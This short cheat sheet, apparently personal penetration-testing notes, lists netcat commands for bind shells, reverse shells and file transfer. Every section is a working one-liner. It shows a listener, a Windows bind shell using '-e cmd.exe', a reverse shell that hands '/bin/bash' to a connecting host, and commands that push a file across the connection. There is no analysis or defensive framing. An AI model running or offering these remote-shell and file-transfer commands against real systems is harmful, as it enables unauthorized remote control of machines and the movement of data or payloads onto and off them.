> NetCat Reverse And Bind Shell And File Transfer 
---------------------------------------
```
> nc -lvnp 4444

$- nc -nv <IP> 4444
```
```
File Transfer
> nc -lvnp 4444 > file.exe -> ready to get a file through connection and write it as file.exe

$- nc -nv <IP> 4444 < /**/**/**/whatever.exe - file to send
```
```
> getting Stdin, Stdout, Stderr on nc shell

> nc -lvnp 4444 -e cmd.exe -> windows

$- nc -nv <IP> 4444
```
```
Reverse Shell
> nc -lvnp 4444 
$- nc -nv <IP> 4444 -e /bin/bash
```


















